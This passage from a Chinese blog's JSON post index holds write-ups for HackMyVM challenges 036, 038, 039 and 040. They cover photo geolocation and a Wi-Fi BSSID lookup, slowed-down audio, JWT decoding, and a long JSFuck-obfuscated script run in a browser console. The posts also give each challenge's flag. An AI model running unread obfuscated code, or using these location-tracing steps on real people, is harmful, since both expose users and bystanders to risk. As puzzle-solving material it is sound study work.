\n```\n\n\u770b\u770b\u56fe\n\n![036](https://7r1umphk.github.io/image/20250614100806952.webp)\n\ngoogle\u626b\u8857\u542f\u52a8\n\n**\u8bc6\u522b\u5173\u952e\u6807\u5fd7**\n\nsu\u5f00\u5934\u7684\uff0c\u7136\u540e\u4e9a\u6d32\u80a4\u8272\uff0c\u7136\u540e\n\n![image-20250614101747240](https://7r1umphk.github.io/image/20250614101747390.webp)\n\n\u8fd9\u73a9\u610f\u5e94\u8be5\u5728\u5ea7\u7684\u5404\u4f4d\u5927\u5b66\u751f\u90fd\u8ba4\u8bc6\u5427\n\n\u9633\u5149\u5728\u7ebf\u5e7f\u573a\n\n\uff08\u7ed9\u6211\u5e72\u7684\u6000\u7591\u662f\u5728china\u4e86\uff09\n\n\u4f46\u662f\uff0c\u8fd9\u91cc\u6709\u65e5\u6587\n\n![image-20250614101905083](https://7r1umphk.github.io/image/20250614101905268.webp)\n\nSunLive\uff08\u65e5\u6587\uff1a\u30b5\u30f3\u30ea\u30d6\uff09\n\n\u626b\u8857\u626b\u8857\uff0c\u4e00\u65f6\u534a\u4f1a\u627e\u4e0d\u5230\uff0cgoogle\u641c\u7d22\u4e00\u4e0b\u5427\n\n![image-20250614102419163](https://7r1umphk.github.io/image/20250614102419498.webp)\n\n\u54c8\u54c8\uff0c\u6709\u524d\u8f88\u7684wp\uff0c\u6211\u4eec\u8fd8\u662f\u4e0d\u770b\u4e86\uff0c\u4f46\u662f\u4ed6\u5176\u4ed6\u7684\u53ef\u80fd\u90fd\u663e\u793a\u4e86\n\n![image-20250614103211358](https://7r1umphk.github.io/image/20250614103211803.webp)\n\n\u5927\u6982\u4f4d\u7f6e\uff1a\u30b3\u30b3\u30ab\u30e9\u30d5\u30a1\u30a4\u30f3\u85ac\u5c40\u3082\u308a\u3064\u306d\u5e97\n\n\u627e\u627e\u5427\n\n![image-20250614103315350](https://7r1umphk.github.io/image/20250614103316425.webp)\n\n\u627e\u5230\u4e86\n\n![image-20250614103343809](https://7r1umphk.github.io/image/20250614103344081.webp)\n\n\u8fd9\u91cc\uff0c\u7136\u540e\u6211\u4eec\u8981\u53bb\u627e**Wi-Fi\u6570\u636e\u5e93**\u6252\u62c9\u4e00\u4e0b\u4e86\n\n\u7528 [wigle.net](https://www.google.com/url?sa=E&q=https%3A%2F%2Fwigle.net%2F)\n\n\u641c\u7d22\u4e00\u4e0b\uff1a 1 Chome-11-25 Moritsune, Kokuraminami Ward, Kitakyushu, Fukuoka 802-0972\u65e5\u672c\n![image-20250614103934917](https://7r1umphk.github.io/image/20250614103935120.webp)\n\n\u7136\u540e\u9700\u8981\u6ce8\u518c\u4e00\u4e0b\uff0c\u4e0d\u7136\u5565\u90fd\u7528\u4e0d\u4e86\n\n![image-20250614104212731](https://7r1umphk.github.io/image/20250614104212971.webp)\n\n\u554a\u8fd9\uff0c\u6362\u4e2a\u7f51\u7ad9\n\n\u6211\u53bb\uff0c\u6ca1\u4e2a\u53ef\u4ee5\u7528\u7684\uff0c\u770b\u770b\u524d\u8f88\u7684wp\u5427\n\nhttps://sec-fortress.github.io/posts/HackMyVM/posts/036.html\n\n```\nHMV{00:3A:9A:7B:5F:40}\n```\n\nsentence", "top": 0, "createdAt": 1751016613, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P49": {"htmlDir": "docs/post/Challenge 038.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 038", "postUrl": "post/Challenge%20038.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/49", "commentNum": 0, "wordCount": 800, "description": "\u590d\u4e60\u590d\u7684\u6709\u70b9\u65e0\u804a\uff0c\u6253\u51e0\u4e2aChallenge\u5427\n\n![image-20250616113539463](https://7r1umphk.github.io/image/20250616113547236.webp)\n\n\u4e0b\u8f7d\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ll 038.zip \n-rwxr-xr-x 1 kali kali 15093 Jun 15 23:36 038.zip\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ unzip 038.zip \nArchive:  038.zip\n  inflating: 038.mp3                 \n                    \n```\n\n\u975e\u5e38\u5feb\u901f\u7684\u5527\u5527\u6b6a\u6b6a\uff0c\u54c8\u54c8\u54c8\n\n\u6162\u653e\u8bd5\u8bd5(audacity)\uff0c\u6ca1\u6709\u7684\u81ea\u5df1\u4e0b\u4e00\u4e2a\n\nhttps://www.audacityteam.org/\n\n\u91cd\u653e\u5230\u5927\u69820.2\u500d\u5c31\u53ef\u4ee5\u542c\u5230\u5b83\u5728\u8bf4\u5b57\u6bcd(\u6548\u679c\u5668>\u97f3\u9ad8\u548c\u901f\u5ea6>\u53d8\u901f\u5e76\u53d8\u8c03)\n\n\u4f46\u662f\u786e\u5b9e\u542c\u4e0d\u6e05\u5b83\u5728\u8bf4\u4ec0\u4e48\uff0c\u5bfc\u51fa\u53bb\n\n\u56e0\u4e3a\u6211\u7535\u8111\u4e0b\u6765\u8bed\u97f3\u8f6c\u6587\u672c\u7684\u6a21\u578b\uff0c\u6211\u5c31\u76f4\u63a5\u7528\u4e86\uff0c\u4f60\u4eec\u53ef\u4ee5\u4e22\u7ed9ai\u4e4b\u7c7b\u7684\n\n![image-20250616124822537](https://7r1umphk.github.io/image/20250616124822922.webp)\n\n```\nHMV{hacktheplanet}\n```\n\nsentence", "top": 0, "createdAt": 1751016616, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P50": {"htmlDir": "docs/post/Challenge 039.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 039", "postUrl": "post/Challenge%20039.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/50", "commentNum": 0, "wordCount": 4537, "description": "![image-20250617111915057](https://7r1umphk.github.io/image/20250617111922673.webp)\n\n\u4e0b\u8f7d\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ unzip 039.zip \nArchive:  039.zip\n  inflating: Challenge.txt           \n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cat Challenge.txt \neyJ0eXAiOiJKV1QiLCJhbGciOiJSUzUxMiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImZsYWciOiJEb05vdFN0b3JlU2Vuc2l0aXZlRGF0YUhlcmUiLCJpYXQiOjE2OTQ0MTk4ODMsImV4cCI6MTY5NDQyMzQ4M30.GZ29CTL0ggEb7ZNvZU7HjeXKWUdco8uLvEbHdpW0DODJQ74IvOPJsoxhL1o5aOq_GLEoOH4vU9fa9kn67zbJcQyr8kjAojX_oVUHyjH4q0UHVASPGgtZMAASUz84TAiX3AWnKFDsgPKumEas01R1CdOv3HVwfU5az5m45D8TPyBB7JxXQdLZyDIIbq4G8fGVUtj3F9oi96d2AzZrpYb8aGyOMsLeDA2wFXSkLQo--6BsY6zOAgsPNVkjrK5jWVXYuvS4U2SnsIp3Gq6vS6rPv4B4qvcBE5-RJ__ZcPg-eZJF-OJzQ9DlKpRE0wg3dzRJWcqTlp6q1Nbk9VQnHc_lUg                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cat -A Challenge.txt \neyJ0eXAiOiJKV1QiLCJhbGciOiJSUzUxMiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImZsYWciOiJEb05vdFN0b3JlU2Vuc2l0aXZlRGF0YUhlcmUiLCJpYXQiOjE2OTQ0MTk4ODMsImV4cCI6MTY5NDQyMzQ4M30.GZ29CTL0ggEb7ZNvZU7HjeXKWUdco8uLvEbHdpW0DODJQ74IvOPJsoxhL1o5aOq_GLEoOH4vU9fa9kn67zbJcQyr8kjAojX_oVUHyjH4q0UHVASPGgtZMAASUz84TAiX3AWnKFDsgPKumEas01R1CdOv3HVwfU5az5m45D8TPyBB7JxXQdLZyDIIbq4G8fGVUtj3F9oi96d2AzZrpYb8aGyOMsLeDA2wFXSkLQo--6BsY6zOAgsPNVkjrK5jWVXYuvS4U2SnsIp3Gq6vS6rPv4B4qvcBE5-RJ__ZcPg-eZJF-OJzQ9DlKpRE0wg3dzRJWcqTlp6q1Nbk9VQnHc_lUg                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ xxd Challenge.txt \n00000000: 6579 4a30 6558 4169 4f69 4a4b 5631 5169  eyJ0eXAiOiJKV1Qi\n00000010: 4c43 4a68 6247 6369 4f69 4a53 557a 5578  LCJhbGciOiJSUzUx\n00000020: 4d69 4a39 2e65 794a 7a64 5749 694f 6949  MiJ9.eyJzdWIiOiI\n00000030: 784d 6a4d 304e 5459 334f 446b 7749 6977  xMjM0NTY3ODkwIiw\n00000040: 6962 6d46 745a 5349 3649 6b70 7661 4734  ibmFtZSI6IkpvaG4\n00000050: 6752 4739 6c49 6977 6959 5752 7461 5734  gRG9lIiwiYWRtaW4\n00000060: 694f 6e52 7964 5755 7349 6d5a 7359 5763  iOnRydWUsImZsYWc\n00000070: 694f 694a 4562 3035 7664 464e 3062 334a  iOiJEb05vdFN0b3J\n00000080: 6c55 3256 7563 326c 3061 585a 6c52 4746  lU2Vuc2l0aXZlRGF\n00000090: 3059 5568 6c63 6d55 694c 434a 7059 5851  0YUhlcmUiLCJpYXQ\n000000a0: 694f 6a45 324f 5451 304d 546b 344f 444d  iOjE2OTQ0MTk4ODM\n000000b0: 7349 6d56 3463 4349 364d 5459 354e 4451  sImV4cCI6MTY5NDQ\n000000c0: 794d 7a51 344d 3330 2e47 5a32 3943 544c  yMzQ4M30.GZ29CTL\n000000d0: 3067 6745 6237 5a4e 765a 5537 486a 6558  0ggEb7ZNvZU7HjeX\n000000e0: 4b57 5564 636f 3875 4c76 4562 4864 7057  KWUdco8uLvEbHdpW\n000000f0: 3044 4f44 4a51 3734 4976 4f50 4a73 6f78  0DODJQ74IvOPJsox\n00000100: 684c 316f 3561 4f71 5f47 4c45 6f4f 4834  hL1o5aOq_GLEoOH4\n00000110: 7655 3966 6139 6b6e 3637 7a62 4a63 5179  vU9fa9kn67zbJcQy\n00000120: 7238 6b6a 416f 6a58 5f6f 5655 4879 6a48  r8kjAojX_oVUHyjH\n00000130: 3471 3055 4856 4153 5047 6774 5a4d 4141  4q0UHVASPGgtZMAA\n00000140: 5355 7a38 3454 4169 5833 4157 6e4b 4644  SUz84TAiX3AWnKFD\n00000150: 7367 504b 756d 4561 7330 3152 3143 644f  sgPKumEas01R1CdO\n00000160: 7633 4856 7766 5535 617a 356d 3435 4438  v3HVwfU5az5m45D8\n00000170: 5450 7942 4237 4a78 5851 644c 5a79 4449  TPyBB7JxXQdLZyDI\n00000180: 4962 7134 4738 6647 5655 746a 3346 396f  Ibq4G8fGVUtj3F9o\n00000190: 6939 3664 3241 7a5a 7270 5962 3861 4779  i96d2AzZrpYb8aGy\n000001a0: 4f4d 734c 6544 4132 7746 5853 6b4c 516f  OMsLeDA2wFXSkLQo\n000001b0: 2d2d 3642 7359 367a 4f41 6773 504e 566b  --6BsY6zOAgsPNVk\n000001c0: 6a72 4b35 6a57 5658 5975 7653 3455 3253  jrK5jWVXYuvS4U2S\n000001d0: 6e73 4970 3347 7136 7653 3672 5076 3442  nsIp3Gq6vS6rPv4B\n000001e0: 3471 7663 4245 352d 524a 5f5f 5a63 5067  4qvcBE5-RJ__ZcPg\n000001f0: 2d65 5a4a 462d 4f4a 7a51 3944 6c4b 7052  -eZJF-OJzQ9DlKpR\n00000200: 4530 7767 3364 7a52 4a57 6371 546c 7036  E0wg3dzRJWcqTlp6\n00000210: 7131 4e62 6b39 5651 6e48 635f 6c55 67    q1Nbk9VQnHc_lUg\n                                                                        \n```\n\nhttps://gchq.github.io/CyberChef/\n\n![image-20250617112131776](https://7r1umphk.github.io/image/20250617112132131.webp)\n\n```\nHMV{DoNotStoreSensitiveDataHere}\n```\n\nsentence", "top": 0, "createdAt": 1751016619, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P51": {"htmlDir": "docs/post/Challenge 040.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 040", "postUrl": "post/Challenge%20040.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/51", "commentNum": 0, "wordCount": 9200, "description": "![image-20250617112222809](https://7r1umphk.github.io/image/20250617112223147.webp)\n\n\u4e0b\u8f7d\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ll 040.zip \n-rwxr-xr-x 1 kali kali 528 Jun 16 23:22 040.zip\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ unzip 040.zip \nArchive:  040.zip\n  inflating: 040.txt                 \n                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cat -A 040.txt      \n[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]])[(![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]]((!![]+[])[+[]])[([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]](([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])+[])[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]])())                                                                                                             \n```\n\n\u8fd9\u662f\u4e00\u79cd\u53eb**JSFuck** \u7684JavaScript \u7f16\u7a0b\u98ce\u683c\uff0c\u62ff\u53bb\u6d4f\u89c8\u5668\u63a7\u5236\u53f0\u6267\u884c\u4e00\u4e0b\u5c31ok\u4e86\n\n\u6253\u5f00\u7f51\u9875about:blank\n\n![image-20250617112545976](https://7r1umphk.github.io/image/20250617112546424.webp)\n\n```\nHMV{jslovesxss}\n```\n\nsentence", "top": 0, "createdAt": 1751016622, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P52": 